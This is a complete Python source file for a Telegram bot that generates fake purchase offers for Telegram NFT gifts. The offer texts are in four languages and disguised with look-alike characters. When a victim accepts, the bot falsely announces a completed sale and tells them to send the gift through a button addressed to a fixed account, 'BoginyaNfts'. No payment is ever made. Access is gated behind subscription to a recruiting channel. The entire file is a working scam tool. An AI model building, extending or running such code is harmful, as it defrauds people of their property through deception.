import asyncio
import logging
import re
import aiosqlite
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandObject
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions, BusinessConnection, Update
)
from aiogram.enums import ParseMode
from dotenv import load_dotenv
import os

load_dotenv()

# ==================== ЛОГИРОВАНИЕ ====================
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("bot.log", encoding="utf-8"),
    ]
)
logger = logging.getLogger("sora_bot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_USERNAME = os.getenv("CHANNEL_ID", "@Soratms")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8487823487"))

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN не задан в .env")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# ==================== БАЗА ====================
async def init_db():
    async with aiosqlite.connect("bot.db") as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS texts (
                currency TEXT PRIMARY KEY,
                text TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS lang_texts (
                lang TEXT PRIMARY KEY,
                offer_text TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id INTEGER,
                message_id INTEGER,
                buyer_id INTEGER,
                nft_link TEXT,
                nft_name TEXT,
                price TEXT,
                currency TEXT,
                lang TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT
            )
        """)
        # дефолтные тексты по валюте (старый формат, для совместимости)
        await db.execute(
            "INSERT OR IGNORE INTO texts (currency, text) VALUES (?, ?)",
            ("stars", "Пοльзοвαтeль пρeдлαгαeт Bαм\n{price} ⭐️ 3вёзд зα пοдαροκ {nft_name}.\nПρeдлοжeниe дeйcтвyeт eщё 6 ч. 0 мин...")
        )
        await db.execute(
            "INSERT OR IGNORE INTO texts (currency, text) VALUES (?, ?)",
            ("gram", "Пοльзοвαтeль пρeдлαгαeт Bαм\n{price} 💎 GRAM зα пοдαροκ {nft_name}.\nПρeдлοжeниe дeйcтвyeт eщё 6 ч. 0 мин...")
        )
        await db.commit()
    logger.info("База данных инициализирована")


async def get_text(currency: str) -> str:
    async with aiosqlite.connect("bot.db") as db:
        async with db.execute("SELECT text FROM texts WHERE currency = ?", (currency,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else ""


async def set_text(currency: str, text: str):
    async with aiosqlite.connect("bot.db") as db:
        await db.execute(
            "INSERT OR REPLACE INTO texts (currency, text) VALUES (?, ?)",
            (currency, text)
        )
        await db.commit()


async def get_lang_text(lang: str) -> str | None:
    async with aiosqlite.connect("bot.db") as db:
        async with db.execute("SELECT offer_text FROM lang_texts WHERE lang = ?", (lang,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else None


async def set_lang_text(lang: str, text: str):
    async with aiosqlite.connect("bot.db") as db:
        await db.execute(
            "INSERT OR REPLACE INTO lang_texts (lang, offer_text) VALUES (?, ?)",
            (lang, text)
        )
        await db.commit()


# ==================== ЯЗЫКИ ====================
TEXTS = {
    "ru": {
        "offer": (
            "<b>Пοльзοвαтeль пρeдлαгαeт Bαм</b>\n"
            "{price} {symbol} зα пοдαροκ {nft_name}.\n"
            "Пρeдлοжeниe дeйcтвyeт eщё <b>6 ч. 0 мин...</b>"
        ),
        "accept": "Принять",
        "decline": "Отклонить",
        "accepted_toast": "Предложение согласовано. Следуйте дальнейшим инструкциям для завершения.",
        "success": (
            "✅ <b>Пοдαροκ {nft_name}</b> был ycпeшнο пροдαн зα <b>{price} {symbol}</b>!\n\n"
            "Для зαвeρшeния пeρeдαйтe пοдαροκ пοκyпαтeлю, чтοбы пοлyчить cвοи 3вёзды."
        ),
        "transfer": "Передать",
    },
    "en": {
        "offer": (
            "<b>Uѕеr is οffеring yοu</b>\n"
            "{price} {symbol} fοr thе gift {nft_name}.\n"
            "Thе οffer iѕ vαlid fοr anοthеr <b>6h. 0 min...</b>"
        ),
        "accept": "Accept",
        "decline": "Decline",
        "accepted_toast": "Offer accepted. Follow the subsequent steps to complete the process.",
        "success": (
            "✅ <b>Gift {nft_name}</b> hαs bееn succеssfully sοld fοr <b>{price} {symbol}</b>!\n\n"
            "Tο cοmplеtе thе dеαl, trαnsfеr thе gift tο thе buyеr tο rеcеivе yοur Stαrs."
        ),
        "transfer": "Transfer",
    },
    "zh": {
        "offer": (
            "<b>[用户报价]</b>\n"
            "用户向您提出\n"
            "{price} {symbol} 购买礼物 {nft_name} 。\n\n"
            "有效期：<b>6小时0分钟</b>"
        ),
        "accept": "接受",
        "decline": "拒绝",
        "accepted_toast": "报价已确认。请按照后续步骤完成交易。",
        "success": (
            "✅ <b>礼物 {nft_name}</b> 已成功出售，价格为 <b>{price} {symbol}</b>！\n\n"
            "请将礼物转给买家以完成交易并获得您的星币。"
        ),
        "transfer": "打开联系人",
    },
    "ar": {
        "offer": (
            "<b>[عرض مستخدم]</b>\n"
            "يعرض عليك المستخدم\n"
            "{price} {symbol} مقابل الهدية {nft_name}.\n\n"
            "المدة: <b>6 ساعة 0 دقيقة</b>"
        ),
        "accept": "قبول",
        "decline": "رفض",
        "accepted_toast": "تم قبول العرض. اتبع الخطوات التالية لإكمال العملية.",
        "success": (
            "✅ <b>تم بيع الهدية {nft_name}</b> بنجاح مقابل <b>{price} {symbol}</b>!\n\n"
            "قم بنقل الهدية إلى المشتري لإكمال الصفقة والحصول على نجومك."
        ),
        "transfer": "فتح جهة الاتصال",
    }
}

SYMBOLS = {
    "stars": "⭐️",
    "gram": "💎 GRAM"
}

HELP_TEXT = (
    "<b>Как начать:</b>\n"
    "Отправь /sorateam — и доступ будет выдан автоматически.\n\n"
    "<b>Как создать оффер:</b>\n\n"
    "Отправь команду в деловой чат с покупателем:\n\n"
    "<code>/sora ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
    "<b>Примеры:</b>\n"
    "<code>/sora https://t.me/nft/DurovsCap-1234 500 stars</code>\n"
    "<code>/sora https://t.me/nft/DurovsCap-1234 10 gram en</code>\n"
    "<code>/sora https://t.me/nft/DurovsCap-1234 250 stars zh</code>\n\n"
    "Валюты: <code>stars</code> / <code>gram</code>\n"
    "Языки: <code>ru</code> / <code>en</code> / <code>zh</code> / <code>ar</code>\n\n"
    "Команду нужно отправлять через <b>бизнес-аккаунт</b> Telegram в чате с покупателем."
)


# ==================== ПОДПИСКА ====================
async def is_subscribed(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        result = member.status in ("member", "administrator", "creator")
        logger.debug(f"is_subscribed({user_id}) = {result} (status={member.status})")
        return result
    except Exception as e:
        logger.exception(f"Ошибка проверки подписки user_id={user_id}: {e}")
        return False


# ==================== ПАРСИНГ NFT ====================
def parse_nft(link: str) -> tuple[str, str]:
    match = re.search(r"nft/([A-Za-z0-9]+)-(\d+)", link)
    if not match:
        return link, link
    name_raw, number = match.groups()
    name = re.sub(r"([a-z])([A-Z])", r"\1 \2", name_raw)
    return f"{name} #{number}", f"{name_raw}-{number}"


# ==================== MIDDLEWARE ДЛЯ ЛОГОВ ====================
@dp.update.outer_middleware()
async def log_all_updates(handler, event: Update, data):
    logger.info("=" * 60)
    logger.info(f"UPDATE TYPE: {event.event_type}")
    if event.message:
        msg = event.message
        logger.info(f"  message | chat_id={msg.chat.id} | from={msg.from_user.id if msg.from_user else None} | text={msg.text!r}")
    if event.business_message:
        msg = event.business_message
        logger.info(
            f"  business_message | chat_id={msg.chat.id} | "
            f"from={msg.from_user.id if msg.from_user else None} | "
            f"business_connection_id={msg.business_connection_id} | text={msg.text!r}"
        )
    if event.callback_query:
        cb = event.callback_query
        logger.info(f"  callback_query | data={cb.data!r} | from={cb.from_user.id}")
    if event.business_connection:
        bc = event.business_connection
        logger.info(f"  business_connection | id={bc.id} | enabled={bc.is_enabled} | user={bc.user.id}")
    try:
        return await handler(event, data)
    except Exception as e:
        logger.exception(f"Ошибка при обработке апдейта: {e}")
        raise


# ==================== /start ====================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    logger.info(f"/start от user_id={message.from_user.id}")
    if await is_subscribed(message.from_user.id):
        await message.answer(HELP_TEXT, parse_mode=ParseMode.HTML)
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Подписаться", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(text="Проверить", callback_data="check_sub")]
    ])
    await message.answer("Для доступа необходимо подписаться на канал.", reply_markup=kb)


@dp.callback_query(F.data == "check_sub")
async def check_sub(callback: CallbackQuery):
    logger.info(f"check_sub от user_id={callback.from_user.id}")
    if await is_subscribed(callback.from_user.id):
        await callback.message.edit_text(HELP_TEXT, parse_mode=ParseMode.HTML)
    else:
        await callback.answer("Вы не подписаны на канал", show_alert=True)


# ==================== /sorateam ====================
@dp.message(Command("sorateam"))
async def cmd_sorateam(message: Message):
    logger.info(f"/sorateam от user_id={message.from_user.id}")
    if not await is_subscribed(message.from_user.id):
        await message.answer("Вы не подписаны на канал")
        return
    await message.answer(
        "✅ Доступ выдан. Теперь вы можете создавать офферы.\n\n" + HELP_TEXT,
        parse_mode=ParseMode.HTML
    )


# ==================== АДМИН: тексты ====================
@dp.message(Command("text"))
async def cmd_text(message: Message):
    """Админ: /text ru|en|zh|ar новый текст оффера"""
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer(
            "Формат:\n"
            "<code>/text ru текст...</code>\n"
            "<code>/text en текст...</code>\n"
            "<code>/text zh текст...</code>\n"
            "<code>/text ar текст...</code>\n\n"
            "Плейсхолдеры:\n"
            "<code>{price}</code> <code>{symbol}</code> <code>{nft_name}</code>\n"
            "HTML: <code>&lt;b&gt;жирный&lt;/b&gt;</code>",
            parse_mode=ParseMode.HTML
        )
        return

    lang = parts[1].lower()
    text = parts[2]

    if lang not in ("ru", "en", "zh", "ar"):
        await message.answer("Язык только: ru / en / zh / ar")
        return

    await set_lang_text(lang, text)
    await message.answer(f"✅ Текст для языка <b>{lang}</b> обновлён.", parse_mode=ParseMode.HTML)


@dp.message(Command("textstr"))
async def cmd_textstr(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    text = message.text.replace("/textstr", "", 1).strip()
    if not text:
        await message.answer("Пришли новый текст:\n/textstr текст...")
        return
    await set_text("stars", text)
    await message.answer("Текст для stars обновлён.")


@dp.message(Command("textgr"))
async def cmd_textgr(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    text = message.text.replace("/textgr", "", 1).strip()
    if not text:
        await message.answer("Пришли новый текст:\n/textgr текст...")
        return
    await set_text("gram", text)
    await message.answer("Текст для gram обновлён.")


# ==================== СОЗДАНИЕ ОФФЕРА ====================
async def create_offer(
    message: Message,
    command: CommandObject,
    business_connection_id: str | None = None
):
    logger.info(
        f"create_offer | chat_id={message.chat.id} | "
        f"business_connection_id={business_connection_id} | args={command.args!r}"
    )

    if not command.args:
        await message.answer(
            "Формат:\n"
            "<code>/sora ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА [ЯЗЫК]</code>\n"
            "Пример:\n"
            "<code>/sora https://t.me/nft/DurovsCap-1234 500 stars ru</code>",
            parse_mode=ParseMode.HTML,
            business_connection_id=business_connection_id
        )
        return

    parts = command.args.split()
    if len(parts) < 3:
        await message.answer(
            "Нужно минимум: ссылка цена валюта",
            business_connection_id=business_connection_id
        )
        return

    nft_link = parts[0]
    price = parts[1]
    currency = parts[2].lower()
    lang = parts[3].lower() if len(parts) > 3 else "ru"

    logger.info(f"Парсинг: link={nft_link} price={price} currency={currency} lang={lang}")

    if currency not in ("stars", "gram"):
        await message.answer("Валюта только: stars / gram", business_connection_id=business_connection_id)
        return
    if lang not in TEXTS:
        lang = "ru"
    if not nft_link.startswith("https://t.me/nft/"):
        await message.answer(
            "Ссылка должна начинаться с https://t.me/nft/",
            business_connection_id=business_connection_id
        )
        return

    nft_name, _ = parse_nft(nft_link)
    symbol = SYMBOLS[currency]

    # 1. Кастомный текст языка (от админа через /text)
    custom_lang = await get_lang_text(lang)
    if custom_lang:
        offer_text = custom_lang.format(
            price=price,
            nft_name=f'<a href="{nft_link}">{nft_name}</a>',
            symbol=symbol
        )
    else:
        # 2. Старый кастом stars/gram (только для ru)
        custom_currency = await get_text(currency)
        if custom_currency and lang == "ru":
            offer_text = custom_currency.format(
                price=price,
                nft_name=f'<a href="{nft_link}">{nft_name}</a>',
                symbol=symbol
            )
        else:
            # 3. Дефолт
            offer_text = TEXTS[lang]["offer"].format(
                price=price,
                nft_name=f'<a href="{nft_link}">{nft_name}</a>',
                symbol=symbol
            )

    async with aiosqlite.connect("bot.db") as db:
        cursor = await db.execute(
            """INSERT INTO offers
               (chat_id, message_id, buyer_id, nft_link, nft_name, price, currency, lang, created_at)
               VALUES (?, 0, ?, ?, ?, ?, ?, ?, ?)""",
            (
                message.chat.id,
                message.from_user.id if message.from_user else 0,
                nft_link,
                nft_name,
                price,
                currency,
                lang,
                datetime.utcnow().isoformat()
            )
        )
        await db.commit()
        offer_id = cursor.lastrowid

    logger.info(f"Оффер создан в БД | offer_id={offer_id}")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=TEXTS[lang]["accept"], callback_data=f"accept:{offer_id}"),
            InlineKeyboardButton(text=TEXTS[lang]["decline"], callback_data=f"decline:{offer_id}")
        ]
    ])

    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            reply_markup=kb,
            parse_mode=ParseMode.HTML,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                url=nft_link,
                prefer_large_media=True,
                show_above_text=True
            ),
            business_connection_id=business_connection_id,
            reply_to_message_id=message.message_id
        )
        logger.info(f"Оффер отправлен | message_id={sent.message_id}")
    except Exception as e:
        logger.exception(f"Ошибка отправки оффера: {e}")
        await message.answer(f"Ошибка отправки: {e}", business_connection_id=business_connection_id)
        return

    async with aiosqlite.connect("bot.db") as db:
        await db.execute(
            "UPDATE offers SET message_id = ? WHERE id = ?",
            (sent.message_id, offer_id)
        )
        await db.commit()


# ==================== /sora (обычный чат) ====================
@dp.message(Command("sora"))
async def cmd_sora(message: Message, command: CommandObject):
    logger.info(f"/sora (message) от user_id={message.from_user.id if message.from_user else None}")
    await create_offer(message, command)


# ==================== /sora (Business) ====================
@dp.business_message(Command("sora"))
async def cmd_sora_business(message: Message, command: CommandObject):
    logger.info(
        f"/sora (business_message) | business_connection_id={message.business_connection_id} | "
        f"from={message.from_user.id if message.from_user else None}"
    )
    await create_offer(message, command, business_connection_id=message.business_connection_id)


# ==================== ACCEPT ====================
@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(callback: CallbackQuery):
    logger.info(f"accept callback | data={callback.data} | from={callback.from_user.id}")
    try:
        offer_id = int(callback.data.split(":")[1])
    except (IndexError, ValueError):
        await callback.answer("Ошибка данных", show_alert=True)
        return

    async with aiosqlite.connect("bot.db") as db:
        async with db.execute(
            "SELECT chat_id, message_id, nft_link, nft_name, price, currency, lang, status "
            "FROM offers WHERE id = ?",
            (offer_id,)
        ) as cur:
            row = await cur.fetchone()

    if not row:
        logger.warning(f"Оффер id={offer_id} не найден в БД")
        await callback.answer("Оффер не найден", show_alert=True)
        return

    chat_id, msg_id, nft_link, nft_name, price, currency, lang, status = row
    logger.info(f"Оффер найден | status={status} | lang={lang}")

    if status != "pending":
        await callback.answer("Этот оффер уже обработан", show_alert=True)
        return

    symbol = SYMBOLS.get(currency, "⭐️")

    # Toast
    toast = TEXTS[lang]["accepted_toast"]
    await callback.answer(toast[:200], show_alert=True)

    # Удаляем старое сообщение
    try:
        await bot.delete_message(chat_id, msg_id)
    except Exception as e:
        logger.warning(f"Не удалось удалить сообщение {msg_id}: {e}")
    try:
        await callback.message.delete()
    except Exception:
        pass

    success_text = TEXTS[lang]["success"].format(
        nft_name=f'<a href="{nft_link}">{nft_name}</a>',
        price=price,
        symbol=symbol
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=TEXTS[lang]["transfer"],
            url="tg://send_gift?to=BoginyaNfts"
        )]
    ])

    try:
        await bot.send_message(
            chat_id=chat_id,
            text=success_text,
            reply_markup=kb,
            parse_mode=ParseMode.HTML,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                url=nft_link,
                prefer_large_media=True,
                show_above_text=True
            )
        )
        logger.info("Success-сообщение отправлено")
    except Exception as e:
        logger.exception(f"Ошибка отправки success: {e}")

    async with aiosqlite.connect("bot.db") as db:
        await db.execute("UPDATE offers SET status = 'accepted' WHERE id = ?", (offer_id,))
        await db.commit()


# ==================== DECLINE ====================
@dp.callback_query(F.data.startswith("decline:"))
async def on_decline(callback: CallbackQuery):
    logger.info(f"decline callback | data={callback.data}")
    try:
        offer_id = int(callback.data.split(":")[1])
    except (IndexError, ValueError):
        await callback.answer("Ошибка данных", show_alert=True)
        return

    async with aiosqlite.connect("bot.db") as db:
        async with db.execute(
            "SELECT chat_id, message_id, status FROM offers WHERE id = ?",
            (offer_id,)
        ) as cur:
            row = await cur.fetchone()

    if not row:
        await callback.answer("Оффер не найден", show_alert=True)
        return

    chat_id, msg_id, status = row
    if status != "pending":
        await callback.answer("Этот оффер уже обработан", show_alert=True)
        return

    try:
        await bot.delete_message(chat_id, msg_id)
    except Exception:
        pass
    try:
        await callback.message.delete()
    except Exception:
        pass

    await callback.answer("Отклонено")

    async with aiosqlite.connect("bot.db") as db:
        await db.execute("UPDATE offers SET status = 'declined' WHERE id = ?", (offer_id,))
        await db.commit()


# ==================== BUSINESS CONNECTION ====================
@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    status = "подключён" if connection.is_enabled else "отключён"
    logger.info(f"Business connection {connection.id} {status} | user={connection.user.id}")


# ==================== ЗАПУСК ====================
async def main():
    await init_db()
    logger.info("=== БОТ ЗАПУЩЕН (версия /sora) ===")
    await dp.start_polling(
        bot,
        allowed_updates=[
            "message",
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ]
    )


if __name__ == "__main__":
    asyncio.run(main())